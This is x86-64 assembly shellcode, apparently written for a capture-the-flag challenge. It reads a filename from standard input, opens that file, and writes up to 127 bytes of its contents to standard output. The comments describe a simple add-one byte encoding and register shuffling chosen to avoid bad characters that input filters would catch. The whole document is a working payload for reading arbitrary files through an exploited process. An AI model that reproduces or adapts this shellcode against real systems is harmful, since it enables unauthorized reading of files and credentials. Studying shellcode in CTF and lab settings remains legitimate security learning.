bits 64

_start:

push byte 0         ; we can use 0 here because we add 1 to each 
                    ; byte in the shellcode to 'encode' it.
pop rbx             ; store this value in rbx. We'll re-use it later.
push rbx            ; copy rbx...
pop rax             ; ...to rax. rax is now 0, the syscall for 'read'
push rbx            ; copy rbx...
pop rdi             ; ...to rdi: fd = stdin 
push rsp            ; copy rsp to rsi
pop rsi             ; rsi is the buffer to which we read the filename to open
                    
push byte 21        ; the filename will be 18 bytes long
pop rdx             ; amount of byte to read
syscall             ; read in the filename

push rbx            ; rbx is still 0
pop rax             ; zero out rax
xor al, 2           ; syscall open. I had to use the xor here to avoid badchars after encoding this shellcode.
push rdi            ; switch around some registers. rdi = 0
push rsi            ; rsi = pointer to filename
pop rdi             ; rdi now points to filename to open
pop rsi             ; rsi = 0, which is O_RDONLY
syscall             ; open file

                    ; switch around the registers again. 
                    ; have to use the push/pops, because `xchg` would generate a badchar after encoding.
push rax            ; filehandle of just opened file
push rsi            ; rsi = 0
push rdi            ; rdi = pointer to top of stack
pop rsi             ; rsi = buf
pop rax             ; rax = 0 (syscall read)
pop rdi             ; rdi = filehandle
push byte 127       ; amount of bytes to read
pop rdx             ; in rdx
syscall             ; read in the contents of the file

push rbx            ; rbx is still 0
pop rax             ; zero out rax
xor al, 1           ; syscall write
push rax            ; copy rax to rdi
pop rdi             ; filehandle = 0 (stdout)
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; write to stdout; get me the flag!
ret                 ; return to handler program
